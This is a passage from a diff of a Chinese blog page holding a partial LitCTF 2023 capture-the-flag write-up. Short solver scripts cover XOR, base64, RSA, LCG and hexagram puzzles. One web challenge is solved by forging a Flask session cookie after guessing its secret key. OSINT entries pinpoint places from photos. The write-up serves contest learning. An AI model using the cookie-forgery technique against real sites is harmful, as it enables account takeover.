-<h2 id="1zjs"><a href="#1zjs" class="headerlink" title="1zjs"></a>1zjs</h2><p><img src="https://img-blog.csdnimg.cn/dce35292f6474628b4eb72404c1833ca.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/b06b2c0780fb475dab8282d952a82983.png" alt="在这里插入图片描述"></p>
-<h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>获取方式都写在之前的题里了</p>
-<h2 id="就当无事发生"><a href="#就当无事发生" class="headerlink" title="就当无事发生"></a>就当无事发生</h2><p>上探姬的github<br><img src="https://img-blog.csdnimg.cn/f01534f3dada472583eaf389d3c55bd9.png" alt="在这里插入图片描述"><br>怕你们找不到<br><code>https://github.com/ProbiusOfficial/ProbiusOfficial.github.io/commit/f04fe251bf8811324d4e71cd87b4b15581358490</code></p>
-<h2 id="Flag点击就送！"><a href="#Flag点击就送！" class="headerlink" title="Flag点击就送！"></a>Flag点击就送！</h2><p>session伪造<br>先随便填个名字拿session<br>然后用flask_session_cookie_manager生成<br><code>SecertKey</code>是<code>LitCTF</code><br>一开始用<code>flask-unsign</code>没爆破出来<br>后面实在没题做一点点手动试SecretKey<br>像<code>Probius</code> <code>NSSCTF</code> <code>LitCTF</code>比赛贴什么试什么</p>
-<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="只需要nc一下"><a href="#只需要nc一下" class="headerlink" title="只需要nc一下~"></a>只需要nc一下~</h2><p>nc连上去 flag在env</p>
-<h2 id="口算题卡"><a href="#口算题卡" class="headerlink" title="口算题卡"></a>口算题卡</h2><p>交互题</p>
-<pre><code class="python">import pwn
-io = pwn.remote(&quot;node6.anna.nssctf.cn&quot;,28258)
-io.recv()
-while True:
-    res = io.recvline()
-    print(res)
-    if b&#39;What is &#39; in res:
-        res = str(eval(res[8:-2]))
-        io.sendline(res.encode())
-</code></pre>
-<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="世界上最棒的程序员"><a href="#世界上最棒的程序员" class="headerlink" title="世界上最棒的程序员"></a>世界上最棒的程序员</h2><p><img src="https://img-blog.csdnimg.cn/4eedc91426c34fd68987b3e559e514e0.png" alt="在这里插入图片描述"></p>
-<h2 id="ez-XOR"><a href="#ez-XOR" class="headerlink" title="ez_XOR"></a>ez_XOR</h2><pre><code class="python">import pwn
-v8 = &#39;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&#39;
-print(pwn.xor(v8,3*3))
-</code></pre>
-<h2 id="enbase64"><a href="#enbase64" class="headerlink" title="enbase64"></a>enbase64</h2><p>换表的base64<br><img src="https://img-blog.csdnimg.cn/39c265793ac14797b7656da96d54a728.png" alt="在这里插入图片描述"><br>把表拿出来解就行</p>
-<pre><code class="python">s = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;
-
-def basechange(source):
-    destination = list(source)
-    v3 = [
-        16, 34, 56, 7, 46, 2, 10, 44, 20, 41, 59, 31, 51, 60, 61, 26, 5, 40, 21, 38,
-        4, 54, 52, 47, 3, 11, 58, 48, 32, 15, 49, 14, 37, 0, 55, 53, 24, 35, 18, 25,
-        33, 43, 50, 39, 12, 19, 13, 42, 9, 17, 28, 30, 23, 36, 1, 22, 57, 63, 8, 27,
-        6, 62, 45, 29
-    ]
-
-    for _ in range(48):
-        for j in range(64):
-            source[j] = destination[v3[j]]
-        destination = source.copy()
-
-    return &#39;&#39;.join(destination)
-print(basechange(list(s)))
-</code></pre>
-<p><img src="https://img-blog.csdnimg.cn/d2a232ac80d2487aa7b8b5b44b5967cb.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/5818d2886f0749358e01bb824e9611f5.png" alt="在这里插入图片描述"></p>
-<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>pyc文件,反编译<br>发现不行,头有问题<br>找个py37的头补上<br><img src="https://img-blog.csdnimg.cn/09d3da2bb5b545709dd75a8f9a16e9a9.png" alt="在这里插入图片描述"><br>然后uncompyle6反编译得到</p>
-<pre><code class="python"># uncompyle6 version 3.9.0
-# Python bytecode version base 3.7.0 (3394)
-# Decompiled from: Python 3.10.8 (tags/v3.10.8:aaaf517, Oct 11 2022, 16:50:30) [MSC v.1933 64 bit (AMD64)]
-# Embedded file name: game.py
-# Compiled at: 2021-08-18 04:22:44
-# Size of source mod 2**32: 3409 bytes
-&quot;&quot;&quot;贪吃蛇&quot;&quot;&quot;
-import random, sys, time, pygame
-from pygame.locals import *
-from collections import deque
-SCREEN_WIDTH = 600
-SCREEN_HEIGHT = 480
-SIZE = 20
-LINE_WIDTH = 1
-SCOPE_X = (
- 0, SCREEN_WIDTH // SIZE - 1)
-SCOPE_Y = (2, SCREEN_HEIGHT // SIZE - 1)
-FOOD_STYLE_LIST = [
- (10, (255, 100, 100)), (20, (100, 255, 100)), (30, (100, 100, 255))]
-LIGHT = (100, 100, 100)
-DARK = (200, 200, 200)
-BLACK = (0, 0, 0)
-RED = (200, 30, 30)
-BGCOLOR = (40, 40, 60)
-
-def print_text(screen, font, x, y, text, fcolor=(255, 255, 255)):
-    imgText = font.render(text, True, fcolor)
-    screen.blit(imgText, (x, y))
-
-
-def init_snake():
-    snake = deque()
-    snake.append((2, SCOPE_Y[0]))
-    snake.append((1, SCOPE_Y[0]))
-    snake.append((0, SCOPE_Y[0]))
-    return snake
-
-
-def create_food(snake):
-    food_x = random.randint(SCOPE_X[0], SCOPE_X[1])
-    food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])
-    while (food_x, food_y) in snake:
-        food_x = random.randint(SCOPE_X[0], SCOPE_X[1])
-        food_y = random.randint(SCOPE_Y[0], SCOPE_Y[1])
-
-    return (
-     food_x, food_y)
-
-
-def get_food_style():
-    return FOOD_STYLE_LIST[random.randint(0, 2)]
-
-
-def main():
-    pygame.init()
-    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
-    pygame.display.set_caption(&#39;贪吃蛇&#39;)
-    font1 = pygame.font.SysFont(&#39;SimHei&#39;, 24)
-    font2 = pygame.font.Font(None, 72)
-    fwidth, fheight = font2.size(&#39;GAME OVER&#39;)
-    b = True
-    snake = init_snake()
-    food = create_food(snake)
-    food_style = get_food_style()
-    pos = (1, 0)
-    game_over = True
-    start = False
-    score = 0
-    orispeed = 0.5
-    speed = orispeed
-    last_move_time = None
-    pause = False
-    while 1:
-        for event in pygame.event.get():
-            if event.type == QUIT:
-                sys.exit()
-
-        screen.fill(BGCOLOR)
-        for x in range(SIZE, SCREEN_WIDTH, SIZE):
-            pygame.draw.line(screen, BLACK, (x, SCOPE_Y[0] * SIZE), (x, SCREEN_HEIGHT), LINE_WIDTH)
-
-        for y in range(SCOPE_Y[0] * SIZE, SCREEN_HEIGHT, SIZE):
-            pygame.draw.line(screen, BLACK, (0, y), (SCREEN_WIDTH, y), LINE_WIDTH)
-
-        curTime = game_over or time.time()
-        if curTime - last_move_time &gt; speed and not pause:
-            b = True
-            last_move_time = curTime
-            next_s = (snake[0][0] + pos[0], snake[0][1] + pos[1])
-            if next_s == food:
-                snake.appendleft(next_s)
-                score += food_style[0]
-                speed = orispeed - 0.03 * (score // 100)
-                food = create_food(snake)
-                food_style = get_food_style()
-            else:
-                if SCOPE_X[0] &lt;= next_s[0] &lt;= SCOPE_X[1]:
-                    if SCOPE_Y[0] &lt;= next_s[1] &lt;= SCOPE_Y[1]:
-                        if next_s not in snake:
-                            snake.appendleft(next_s)
-                            snake.pop()
-                        else:
-                            game_over = True
-                    if not game_over:
-                        pygame.draw.rect(screen, food_style[1], (food[0] * SIZE, food[1] * SIZE, SIZE, SIZE), 0)
-                    for s in snake:
-                        pygame.draw.rect(screen, DARK, (s[0] * SIZE + LINE_WIDTH, s[1] * SIZE + LINE_WIDTH,
-                         SIZE - LINE_WIDTH * 2, SIZE - LINE_WIDTH * 2), 0)
-
-                    print_text(screen, font1, 30, 7, f&quot;速度: &#123;score // 100&#125;&quot;)
-                    print_text(screen, font1, 450, 7, f&quot;得分: &#123;score&#125;&quot;)
-                    if score &gt; 1000:
-                        flag = [
-                         30, 196, 
-                         52, 252, 49, 220, 7, 243, 
-                         3, 241, 24, 224, 40, 230, 
-                         25, 251, 28, 233, 40, 237, 
-                         4, 225, 4, 215, 40, 231, 
-                         22, 237, 14, 251, 10, 169]
-                        for i in range(0, len(flag), 2):
-                            flag[i], flag[i + 1] = flag[i + 1] ^ 136, flag[i] ^ 119
-
-                        print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, bytes(flag).decode(), RED)
-                        pygame.display.update()
-                    if game_over:
-                        if start:
-                            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, &#39;GAME OVER&#39;, RED)
-                pygame.display.update()
-
-
-if __name__ == &#39;__main__&#39;:
-    main()
-</code></pre>
-<p>找到输出flag的那段逻辑运行</p>
-<pre><code class="python">flag = [
-    30, 196, 
-    52, 252, 49, 220, 7, 243, 
-    3, 241, 24, 224, 40, 230, 
-    25, 251, 28, 233, 40, 237, 
-    4, 225, 4, 215, 40, 231, 
-    22, 237, 14, 251, 10, 169]
-for i in range(0, len(flag), 2):
-    flag[i], flag[i + 1] = flag[i + 1] ^ 136, flag[i] ^ 119
-for i in flag:
-    print(chr(i),end=&#39;&#39;)
-</code></pre>
-<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Hex？Hex！-初级"><a href="#Hex？Hex！-初级" class="headerlink" title="Hex？Hex！(初级)"></a>Hex？Hex！(初级)</h2><p>long_to_bytes</p>
-<h2 id="梦想是红色的-初级"><a href="#梦想是红色的-初级" class="headerlink" title="梦想是红色的 (初级)"></a>梦想是红色的 (初级)</h2><p>社会主义核心价值观解码</p>
-<h2 id="原来你也玩原神-初级"><a href="#原来你也玩原神-初级" class="headerlink" title="原来你也玩原神 (初级)"></a>原来你也玩原神 (初级)</h2><p>百度查表一个个对</p>
-<h2 id="家人们！谁懂啊，RSA签到都不会-初级"><a href="#家人们！谁懂啊，RSA签到都不会-初级" class="headerlink" title="家人们！谁懂啊，RSA签到都不会 (初级)"></a>家人们！谁懂啊，RSA签到都不会 (初级)</h2><pre><code class="python">from Crypto.Util.number import *
-import gmpy2
-p = 12567387145159119014524309071236701639759988903138784984758783651292440613056150667165602473478042486784826835732833001151645545259394365039352263846276073
-q = 12716692565364681652614824033831497167911028027478195947187437474380470205859949692107216740030921664273595734808349540612759651241456765149114895216695451
-c = 108691165922055382844520116328228845767222921196922506468663428855093343772017986225285637996980678749662049989519029385165514816621011058462841314243727826941569954125384522233795629521155389745713798246071907492365062512521474965012924607857440577856404307124237116387085337087671914959900909379028727767057
-e = 65537
-n = p*q
-print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)*(q-1))),n)))
-</code></pre>
-<h2 id="yafu-中级"><a href="#yafu-中级" class="headerlink" title="yafu (中级)"></a>yafu (中级)</h2><p>yafu分解pq其它和上题一样</p>
-<h2 id="factordb-中级"><a href="#factordb-中级" class="headerlink" title="factordb (中级)"></a>factordb (中级)</h2><p>factordb查pq其它和上题一样</p>
-<h2 id="校外-P-Leak"><a href="#校外-P-Leak" class="headerlink" title="(校外)P_Leak"></a>(校外)P_Leak</h2><p>dp泄露</p>
-<h2 id="校外-md5的破解"><a href="#校外-md5的破解" class="headerlink" title="(校外)md5的破解"></a>(校外)md5的破解</h2><pre><code class="python">from Crypto.Util.number import *
-import hashlib
-import string
-s = string.ascii_lowercase+string.digits
-
-enc = &quot;LitCTF&#123;&#123;md5can&#123;&#125;&#123;&#125;3de&#123;&#125;rypt213thoughcr&#123;&#125;sh&#125;&#125;&quot;
-print(enc)
-target = &#39;496603d6953a15846cd7cc476f146771&#39;
-for i in s:
-    for i2 in s:
-        for j in s:
-            for k in s:
-                    tmp = enc.format(i,i2,j,k)
-                    if (hashlib.md5(tmp.encode()).hexdigest() == target):
-                        print (tmp)
-                        break
-</code></pre>
-<h2 id="校外-e的学问"><a href="#校外-e的学问" class="headerlink" title="(校外)e的学问"></a>(校外)e的学问</h2><p>e phi 不互素</p>
-<h2 id="校外-我测你vva"><a href="#校外-我测你vva" class="headerlink" title="(校外)我测你vva"></a>(校外)我测你vva</h2><pre><code class="python">def decrypt(ciphertext):
-    decrypted = &quot;&quot;
-    for i in range(len(ciphertext)):
-        if i % 2 == 0:
-            cipher = ord(ciphertext[i])
-            cipher = cipher - i
-            decrypted += chr(cipher)
-        else:
-            cipher = ord(ciphertext[i])
-            cipher = cipher + i
-            decrypted += chr(cipher)
-    return decrypted
-
-ciphertext = &quot;HYEQJvPZ~X@+Bp&quot;  # 输入加密后的字符串
-plaintext = decrypt(ciphertext)
-print(plaintext)
-</code></pre>
-<h2 id="The-same-common-divisor-高级"><a href="#The-same-common-divisor-高级" class="headerlink" title="The same common divisor (高级)"></a>The same common divisor (高级)</h2><p>共模<br>n2拿n1^n3求</p>
-<h2 id="你是我的关键词-Keyworld-初级"><a href="#你是我的关键词-Keyworld-初级" class="headerlink" title="你是我的关键词(Keyworld) (初级)"></a>你是我的关键词(Keyworld) (初级)</h2><p>我不知道是不是这么做的,我是这么做的<br>这是原文<br><code>IFRURC&#123;X0S_YP3_JX_HBXV0PA&#125;</code><br>前六位必为LITCTF 单表替换<br>然后根据你是我的关键词猜测得到<br>you_are_my_keyword<br>一一对应替换再改nss<br><code>NSSCTF&#123;Y0U_AR3_MY_KEYW0RD&#125;</code></p>
-<h2 id="校外-Is-this-only-base"><a href="#校外-Is-this-only-base" class="headerlink" title="(校外)Is this only base?"></a>(校外)Is this only base?</h2><p><img src="https://img-blog.csdnimg.cn/ca8135e926824a0984905c8701fd7025.png" alt="rail fance 23"></p>
-<h2 id="校外-Virginia"><a href="#校外-Virginia" class="headerlink" title="(校外)Virginia"></a>(校外)Virginia</h2><p>Virginia密码<br><code>https://www.guballa.de/vigenere-solver</code><br>上半密码flag<br>下半密码ulub</p>
-<pre><code class="python">flag=[86, 116, 128, 80, 98, 85, 139, 122, 134, 114, 125, 136, 117, 123, 129, 127, 128, 128, 142, 130, 140, 147, 127, 132, 131, 136, 151, 134, 152, 164]
-
-xxx = &#39;&#39;
-for i in range(len(flag)):
-    xxx += chr(flag[::-1][i] - (39-i))
-
-print(xxx[::-1])
-</code></pre>
-<h2 id="校外-babyLCG"><a href="#校外-babyLCG" class="headerlink" title="(校外)babyLCG"></a>(校外)babyLCG</h2><pre><code class="python">from sympy import *
-from gmpy2 import *
-from functools import reduce
-from primefac import *
-result = [699175025435513913222265085178805479192132631113784770123757454808149151697608216361550466652878, 193316257467202036043918706856603526262215679149886976392930192639917920593706895122296071643390, 1624937780477561769577140419364339298985292198464188802403816662221142156714021229977403603922943, 659236391930254891621938248429619132720452597526316230221895367798170380093631947248925278766506, 111407194162820942281872438978366964960570302720229611594374532025973998885554449685055172110829, 1415787594624585063605356859393351333923892058922987749824214311091742328340293435914830175796909, 655057648553921580727111809001898496375489870757705297406250204329094679858718932270475755075698, 1683427135823894785654993254138434580152093609545092045940376086714124324274044014654085676620851, 492953986125248558013838257810313149490245209968714980288031443714890115686764222999717055064509, 70048773361068060773257074705619791938224397526269544533030294499007242937089146507674570192265]
-
-
-
-def crack_unknown_modulus(states): 
-    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])] 
-    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])] 
-    modulus = abs(reduce(gcd, zeroes)) 
-    factors = factorint(modulus)
-    while not isprime(modulus): 
-        for prime, order in factors.items():
-            if prime.bit_length() &gt; 128:
-                continue
-            modulus = modulus / prime**order
-    multiplier = (states[2] - states[1]) * modinv(states[1] - states[0], modulus) % modulus 
-    increment = (states[1] - states[0]*multiplier) % modulus
-    print((states[0] - increment) * invert(multiplier, modulus) % modulus)
-    return modulus, multiplier, increment
-_,__,___ = crack_unknown_modulus(result)
-</code></pre>
-<p>运行得到种子<br>种子long_to_bytes就是flag</p>
-<h2 id="easy-math-中级"><a href="#easy-math-中级" class="headerlink" title="easy_math (中级)"></a>easy_math (中级)</h2><p>z3求p q</p>
-<pre><code class="python">import z3
-p,q = z3.Ints(&#39;p q&#39;)
-x = z3.Solver()
-
-n = 2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797
-hint = 392490868359411675557103683163021977774935163924606169241731307258226973701652855448542714274348304997416149742779376023311152228735117186027560227613656229190807480010615064372521942836446425717660375242197759811804760170129768647414717571386950790115746414735411766002368288743086845078803312201707960465419405926186622999423245762570917629351110970429987377475979058821154568001902541710817731089463915930932142007312230897818177067675996751110894377356758932
-equs = [p**3 - q**5 == hint, p*q==n]
-x.add(equs)
-check = x.check()
-model = x.model()
-print(model)
-</code></pre>
-<pre><code class="python">import z3
-from Crypto.Util.number import *
-import gmpy2
-
-
-e = 65537
-c = 2168563038335029902089976057856861885635845445863841607485310134441400500612435296818745930370268060353437465666224400129105788787423156958336380480503762222278722770240792709450637433509537280
-n = 2230791374046346835775433548641067593691369485828070649075162141394476183565187654365131822111419512477883295758461313983481545182887415447403634720326639070667688614534290859200753589300443797
-
-q = 304683618109085947723284393392507415311
-p = 7321664971326604351487965655099805117568571010588695608389113791312918573783115429227542573780838065461696504325762281209452761930184231131129306271846427
-print(long_to_bytes(pow(c,(gmpy2.invert(e,(p-1)*(q-1))),n)))
-</code></pre>
-<h2 id="校外-隐晦的聊天记录"><a href="#校外-隐晦的聊天记录" class="headerlink" title="(校外)隐晦的聊天记录"></a>(校外)隐晦的聊天记录</h2><p>一次一密(opt)</p>
-<pre><code class="python">import pwn
-a = b&#39;6c73d5240a948c86981bc294814d&#39;
-
-
-b = b&#39;attack at dawn&#39;
-b = bytes.hex(b).encode()
-c = b&#39;Monday or Thur&#39;
-c = bytes.hex(c).encode()
-flag = &#39;&#39;
-for i in range(0,len(a),2):
-    intres = int(a[i:i+2],16)^int(b[i:i+2],16)^int(c[i:i+2],16)
-    strres = str(hex(intres)).replace(&quot;0x&quot;,&quot;&quot;)
-    if len(strres)!=2:
-        print(i)
-        strres = &#39;0&#39;+strres
-
-    flag += strres
-
-print(flag.encode())
-</code></pre>
-<h2 id="校外-Euler"><a href="#校外-Euler" class="headerlink" title="(校外)Euler"></a>(校外)Euler</h2><p>欧拉降幂<br>m ^(n-p-q+3)^ ≡ c mod n<br>等价于<br>m ^(n-p-q+3)mod^ ^φn()^ ≡ c mod n</p>
-<pre><code class="python">import gmpy2
-from Crypto.Util.number import *
-n = 115140122725890943990475192890188343698762004010330526468754961357872096040956340092062274481843042907652320664917728267982409212988849109825729150839069369465433531269728824368749655421846730162477193420534803525810831025762500375845466064264837531992986534097821734242082950392892529951104643690838773406549
-c = 406480424882876909664869928877322864482740577681292497936198951316587691545267772748204383995815523935005725558478033908575228532559165174398668885819826720515607326399097899572022020453298441
-# c = pow(m,2,n)
-print(long_to_bytes(gmpy2.iroot(c,2)[0]))
-</code></pre>
-<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><p>这边主要是队友在做,队友做的我就不写了 </p>
-<h2 id="OSINT-探姬去哪了-1"><a href="#OSINT-探姬去哪了-1" class="headerlink" title="OSINT 探姬去哪了?_1"></a>OSINT 探姬去哪了?_1</h2><p>图片上勉强能认清字母<br>搜索得知是松果酒店<br>然后高德搜,试了几个就对了</p>
-<p>松果酒店(郑州农业路店)</p>
-<h2 id="OSINT-探姬去哪了-3"><a href="#OSINT-探姬去哪了-3" class="headerlink" title="OSINT 探姬去哪了?_3"></a>OSINT 探姬去哪了?_3</h2><p>给了图cqr扫,得知是郑州轻工业大学<br>最后一定是2层-217<br>一共两个校区,来回试试<br>然后搜个楼层图一个个试,也就十几次就出了<br>科学校区-第1教学楼-2层-217</p>
-<h2 id="两仪生四象-中级"><a href="#两仪生四象-中级" class="headerlink" title="两仪生四象 (中级)"></a>两仪生四象 (中级)</h2><pre><code class="python">_hash = &#123;&quot;乾&quot;: &quot;111&quot;, &quot;兑&quot;: &quot;011&quot;, &quot;离&quot;: &quot;101&quot;, &quot;震&quot;: &quot;001&quot;, &quot;巽&quot;: &quot;110&quot;, &quot;坎&quot;: &quot;010&quot;, &quot;艮&quot;: &quot;100&quot;, &quot;坤&quot;: &quot;000&quot;&#125;
-
-_reverse_hash = &#123;v: k for k, v in _hash.items()&#125;
-
-text = &quot;LitCTF&#123;*********&#125;&quot;
-
-text = text[7:-1]
-
-binary_text = &#39;&#39;.join(format(ord(c), &#39;010b&#39;) for c in text)
-
-encoded_text = &quot;&quot;
-for i in range(0, len(binary_text), 3):
-    try:
-        encoded_text += _reverse_hash[binary_text[i:i + 3]]
-    except KeyError:
-        encoded_text += &quot;&quot;
-
-print(encoded_text)
-
-encoded_text = &quot;坤乾兑艮兑坎坤坤巽震坤巽震艮兑坎坤震兑乾坤巽坤艮兑震巽坤巽艮坤巽艮艮兑兑艮震兑乾坤乾坤坤兑艮艮坤巽坤坤巽坎坤兑离坎震艮兑坤巽坎艮兑震坤震兑乾坤乾坎坤兑坎坤震艮离坤离乾艮震艮巽震离震坤巽兑艮兑坎坤震巽艮坤离乾艮坎离坤震巽坎坤兑坤艮兑震巽震巽坎坤巽坤艮兑兑坎震巽兑&quot; 
-
-res = &#39;&#39;
-for i in encoded_text:
-    res += _hash[i]
-print(res)
-tem = &#39;&#39;
-flag = &#39;&#39;
-for i in range(len(res)):
-    tem += res[i]        
-    if (i+1) %  10 == 0:
-        flag += chr(int(tem,2))
-        tem = &#39;&#39;
-print(&quot;LitCTF&#123;&quot;+flag+&quot;&#125;&quot;)
-</code></pre>
-<h2 id="校外-赛博算命"><a href="#校外-赛博算命" class="headerlink" title="(校外)赛博算命"></a>(校外)赛博算命</h2><p><img src="https://img-blog.csdnimg.cn/877741123fa34b1bb6f6a71999a4a387.png" alt="在这里插入图片描述"></p>
-<pre><code class="python"># assert flag = &#39;LitCTF&#123;xxxxxx_xxxx_xx&#125;&#39;
-#      噬嗑    渐      临      蒙      升      履 
-# 未济 讼 讼 涣 益 益 夬 否 渐 涣 旅 夬 小畜 未济 
-# 同人
-# 001100  101001  110100                   
-# L       i       t       C       T       F
-# flag[i] = func_A (func_B (str[i]) + 64);
-flag = &#39;&#39;
-enc = []
-
-enc.append(&#39;未济&#39;) 
-enc.append(&#39;讼&#39;) 
-enc.append(&#39;讼&#39;) 
-enc.append(&#39;涣&#39;) 
-enc.append(&#39;益&#39;) 
-enc.append(&#39;益&#39;) 
-enc.append(&#39;夬&#39;) 
-enc.append(&#39;否&#39;) 
-enc.append(&#39;渐&#39;) 
-enc.append(&#39;涣&#39;) 
-enc.append(&#39;旅&#39;) 
-enc.append(&#39;夬&#39;) 
-enc.append(&#39;小畜&#39;) 
-enc.append(&#39;未济&#39;) 
-print(enc)
-dic = &#123;&quot;未济&quot;:&#39;101010&#39;,&quot;讼&quot;:&#39;111010&#39;,&quot;涣&quot;:&#39;110010&#39;,&quot;益&quot;:&#39;110001&#39;,&quot;夬&quot;:&#39;011111&#39;,&quot;否&quot;:&#39;111000&#39;,&quot;渐&quot;:&#39;110100&#39;,&quot;旅&quot;:&#39;101100&#39;,&quot;小畜&quot;:&#39;110111&#39;&#125;
-res = &#39;&#39;
-for i in enc:
-    res += chr(int(dic[i],2) + 64)    
-print(&#39;LitCTF&#123;&#39;+res+&#39;&#125;&#39;)
-</code></pre>
-<p>这里说一下思路<br>首先把字符对应的<code>LITCTF&#123;</code>   <code>&#125;</code>给去了,少写点<br>然后这些是百度找卦象的图,全的那个算1 残的那个算0<br>卦转10进制+48再转ascii就行了</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>最终排名35<br>acm出不了一点,pwn爷还在成长,总体来说大伙稍微能做点题了</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/vim/" style="color: #ffa2c4">vim</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="color: #00bcd4">数据库</a>
-        </span>
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%BC%96%E8%BE%91%E5%99%A8/" style="color: #00a596">编辑器</a>
-        </span>
-        
-    </div>
-    <a href="/2023/05/14/LITCTF2023%20%E9%83%A8%E5%88%86WP/" class="go-post">阅读全文</a>
+    <a href="/2023/05/16/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%20%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E8%B5%9B%E5%89%8D%E6%A8%A1%E6%8B%9F%E9%A2%98%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
 </div>
 
 
